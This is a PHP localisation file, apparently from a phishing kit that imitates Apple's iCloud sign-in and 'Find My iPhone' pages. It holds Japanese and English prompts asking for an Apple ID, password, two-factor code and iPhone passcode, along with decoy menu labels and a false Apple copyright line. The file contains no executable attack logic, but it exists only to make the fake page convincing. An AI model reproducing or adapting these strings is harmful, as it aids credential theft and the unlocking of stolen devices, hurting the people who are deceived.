<?php
/*
 * @ PHP 5.6
 * @ Decoder version : 1.0.0.1
 * @ Release on : 24.03.2018
 * @ Website    : http://EasyToYou.eu
 */

$lang = array();
$lang["PAGE_TITLE"] = "iCloud";
$lang["SETUP_INSTRUCTIONS"] = "セットアップの手順";
$lang["MOB_locating"] = "Locating...";
$lang["ALERT0"] = "アカウントにサインインします。";
$lang["ALERT1"] = "Authentication Required";
$lang["ALERT2"] = "Enter your Apple ID & password";
$lang["HELP"] = "Help";
$lang["ALERT3"] = "to see the last location.";
$lang["ALERT4"] = "Apple IDまたはパスワードが間違っていました。";
$lang["VERIFY"] = "Verify your identity.";
$lang["PROTECTED"] = "Your Apple ID is protected with two-factor authentication.";
$lang["CODESHOWN"] = " Enter the Passcode of your iPhone or verification code shown on your other devices.";
$lang["VERIFYING"] = "Verifying...";
$lang["SIGN_IN_TITLE"] = "iCloud上にサインイン";
$lang["INCORRECT_ID"] = "お使いのApple IDまたはパスワードが正しくありませんでした。";
$lang["APPLE_ID"] = "アップルID";
$lang["PASSWORD"] = "パスワード";
$lang["KEEP_ME"] = "次回から自動的にログイン";
$lang["FORGOT_ID"] = "お使いのApple IDまたはパスワードを忘れましたか？";
$lang["DONT_HAVE_ID"] = "Apple IDをお持ちでませんか？ ";
$lang["CREATE_YOURS"] = "今あなたを作成します。";
$lang["CHECK_ACTIVATION"] = "アクティベーションロックステータスをチェック";
$lang["SYSTEM_STATUS"] = "システムステータス";
$lang["POLICY"] = "個人情報保護方針";
$lang["TERMS"] = "利用規約";
$lang["COPYRIGHT"] = "Copyright © 2019 Apple Inc. 無断複写・転載を禁じます";
$lang["MOB_PAGE_TITLE"] = "iCloud";
$lang["MOB_FIND"] = "iPhoneを探します";
$lang["MOB_APPLE_ID"] = "アップルID";
$lang["MOB_EXAMPLE"] = "example@icloud.com";
$lang["MOB_PASSWORD"] = "パスワード";
$lang["MOB_REQUIRED"] = "必須";
$lang["MOB_LOGIN"] = "サインイン...";
$lang["MOB_FORGOT_ID"] = "Apple IDまたはパスワードを忘れましたか？";
$lang["MOB_SETUP_INSTRUCTIONS"] = "セットアップの手順";
$lang["MOB_locating"] = "場所...";
$lang["REMINDERS"] = "リマインダー";
$lang["NOTES"] = "ノート";
$lang["ICLOUD_DRIVE"] = "iCloudのドライブ";
$lang["PHOTOS"] = "写真";
$lang["CONTACTS"] = "コンタクト";
$lang["MAIL"] = "郵便物";
$lang["SETTINGS"] = "設定";
$lang["FIND_MY_IPHONE"] = "iPhoneを探します";
$lang["KEYNOTE"] = "基調";
$lang["NUMBERS"] = "数字";
$lang["FIND_FRIENDS"] = "友達を見つける";
$lang["PAGES"] = "ページ";
$lang["ALL_DEVICES"] = "すべてのデバイス";
$lang["ICLOUD_SETTINGS"] = "iCloudの設定";
$lang["SIGN_OUT"] = "サインアウト";
$lang["LOCATE"] = "場所...";
$lang["WELCOME"] = "Appleサポートへようこそ";
$lang["IMPROVE"] = "彼らはインターネットに接続されていない場合でもあなたのiDevicesを見つける可能性を向上させます。";
$lang["MOMENT"] = "紛失したiPhoneを見つけるのに数分かかることがあります。";
$lang["ALL_DEVICES_OFFLINE"] = "すべてのデバイスのオフライン";
$lang["NO_LOCO"] = "すべてのデバイスがオフラインであるため、いかなる場所を示すことができません。";

?>